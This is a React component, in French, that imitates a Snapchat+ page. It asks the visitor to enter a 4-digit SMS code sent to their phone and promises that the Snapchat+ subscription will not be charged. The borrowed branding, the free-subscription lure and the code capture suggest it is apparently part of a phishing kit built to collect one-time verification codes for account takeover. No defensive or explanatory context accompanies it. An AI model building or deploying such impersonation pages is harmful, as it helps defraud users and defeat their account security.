import { useState, useRef } from "react";
import { motion } from "framer-motion";
import { ChevronRight } from "lucide-react";

export default function CodeVerification({ data, onSubmit, loading }) {
  const [code, setCode] = useState(["", "", "", ""]);
  const inputs = useRef([]);

  const handleChange = (i, val) => {
    if (!/^\d?$/.test(val)) return;
    const newCode = [...code];
    newCode[i] = val;
    setCode(newCode);
    if (val && i < 3) inputs.current[i + 1]?.focus();
  };

  const handleKeyDown = (i, e) => {
    if (e.key === "Backspace" && !code[i] && i > 0) {
      inputs.current[i - 1]?.focus();
    }
  };

  const handlePaste = (e) => {
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 4);
    if (pasted.length === 4) {
      setCode(pasted.split(""));
      inputs.current[3]?.focus();
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    const full = code.join("");
    if (full.length === 4) onSubmit(full);
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5 }}
      className="w-full max-w-sm mx-auto"
    >
      <div className="bg-card border border-border rounded-3xl px-6 py-10 shadow-2xl shadow-black/60 text-center">

        {/* Logo */}
        <div className="flex flex-col items-center mb-6">
          <div className="w-16 h-16 bg-primary rounded-2xl flex items-center justify-center mb-4 shadow-lg shadow-primary/30">
            <span className="text-3xl">👻</span>
          </div>
          <h1 className="font-heading text-3xl font-black text-foreground tracking-tight">
            Snapchat<span className="text-primary">+</span>
          </h1>
        </div>

        {/* SMS icon */}
        <div className="w-16 h-16 bg-primary/15 border border-primary/30 rounded-full flex items-center justify-center mx-auto mb-5">
          <span className="text-3xl">💬</span>
        </div>

        <h2 className="font-heading text-xl font-bold text-foreground mb-2">
          Code de vérification
        </h2>
        <p className="text-muted-foreground text-sm mb-8 leading-relaxed">
          Un code SMS à 4 chiffres a été envoyé au{" "}
          <span className="text-foreground font-semibold">{data?.telephone}</span>
        </p>

        {/* 4-digit input */}
        <form onSubmit={handleSubmit}>
          <div className="flex justify-center gap-3 mb-8" onPaste={handlePaste}>
            {code.map((digit, i) => (
              <input
                key={i}
                ref={(el) => (inputs.current[i] = el)}
                type="tel"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                className="w-16 h-16 text-center text-2xl font-bold bg-white/5 border-2 border-white/10 rounded-xl text-foreground focus:outline-none focus:border-primary focus:bg-primary/5 transition-all"
              />
            ))}
          </div>

          <motion.button
            type="submit"
            disabled={loading || code.join("").length < 4}
            whileHover={{ scale: loading ? 1 : 1.02 }}
            whileTap={{ scale: loading ? 1 : 0.98 }}
            className="w-full bg-primary text-primary-foreground font-bold py-4 rounded-xl text-base tracking-wide transition-all duration-200 disabled:opacity-40 disabled:cursor-not-allowed shadow-lg shadow-primary/30 flex items-center justify-center gap-2"
          >
            {loading ? (
              <span className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
            ) : (
              <>Valider <ChevronRight className="w-5 h-5" /></>
            )}
          </motion.button>
        </form>

        <p className="text-muted-foreground/50 text-xs mt-6 leading-relaxed">
          L'abonnement Snapchat+ ne vous sera pas facturé.<br />
          L'abonnement est disponible uniquement pour les utilisateurs éligibles.
        </p>
      </div>
    </motion.div>
  );
}